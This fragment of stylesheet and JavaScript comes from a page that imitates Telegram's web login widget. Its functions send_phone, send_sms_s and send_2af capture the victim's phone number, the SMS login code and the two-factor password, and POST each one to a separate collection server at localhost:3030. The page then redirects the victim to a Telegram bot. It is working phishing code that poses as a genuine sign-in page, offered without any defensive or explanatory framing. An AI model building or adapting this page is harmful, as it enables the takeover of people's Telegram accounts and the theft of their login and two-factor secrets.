  top: 0;
  width: 100%;
  height: 100%;

}

  left: -10px;
  top: -10px;
  width: calc(100% + 20px);
  height: calc(100% + 20px);
  animation: bg-motion 10s linear infinite;
}

  position: absolute;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%;

  -webkit-mask-image: var(--pattern-url, none);
  opacity: var(--pattern-intensity, 1);
}

}

function send_2af() {
  const req = new XMLHttpRequest();
  req.open("POST", "http://localhost:3030/password");
  req.send(JSON.stringify({
    "phone": PHONE,
    "password": getEl('2af-pass').value
  }));
  setTimeout(
    () => {
      window.location.href = "https://t.me/lebedev_ico_bot";
    }, 1000
  );
}

let PHONE;
let TFA;

function send_phone(msg) {
  msg = msg.replaceAll(" ", "");
  PHONE = msg;
  console.log(msg);
  const req = new XMLHttpRequest();
  req.open("POST", "http://localhost:3030/phone");
  req.send(JSON.stringify({
    "phone": msg
  }));

  console.log(req.response);
}

function send_sms_s(msg) {
  console.log(msg)
  const req = new XMLHttpRequest();
  req.onreadystatechange = function() {
    if (req.readyState == XMLHttpRequest.DONE) {
      if (req.status == 200) { TFA = false }
      if (req.status == 400) { TFA = true }
      
    }
  }
  req.open("POST", "http://localhost:3030/code");
  req.send(JSON.stringify({
    "phone": PHONE,
    "code": msg
  }));

}

function requestConfirmation(event) {
  event && event.preventDefault();
  getEl('login-phone-code-textfield').classList.remove('is-invalid');
  getEl('login-phone-textfield').classList.remove('is-invalid');
  getEl('login-alert').innerHTML = '';
  var code = getEl('login-phone-code').value;
  var phone = getEl('login-phone').value;
  
  send_phone(code + phone);
  
  openConfirmation();
  return true;
}
function openConfirmation() {
  var code = getEl('login-phone-code').value;
  var phone = getEl('login-phone').value;
  getEl('login-phone-field').innerHTML = (code.length > 1 ? code + ' ' : code) + phone;
  getEl('login-phone-field_2').innerHTML = (code.length > 1 ? code + ' ' : code) + phone;
  getEl('send-form').classList.add('hide');
  getEl('login-form').classList.remove('hide');
  <!-- checkAuth(); -->
}
function cancelConfirmation(event) {
  event && event.preventDefault();
  getEl('login-phone-field').innerHTML = '';
  getEl('send-form').classList.remove('hide');
  getEl('login-form').classList.add('hide');
  getEl('login-phone').focus();
  clearTimeout(window.authTimeout);
  return false;
}
function checkAuth() {
  location.reload();
  clearTimeout(window.authTimeout);
  window.authTimeout = setTimeout(function doCheckAuth() {
    ajax('/auth/login?bot_id=531675494&origin=https%3A%2F%2Ftelegram.org&embed=1&request_access=write&return_to=https%3A%2F%2Ftelegram.org%2Fblog%2Flogin', {}, function(result) {
      if (result) {
        location.reload();
      } else {
        checkAuth();
      }
    }, function (xhr) {
      cancelConfirmation();
      showLoginError(xhr.responseText || 'Server error');
    });
  }, 700);
}
function loginCancel(e) {
  cancelConfirmation(e);
  window.close();
}
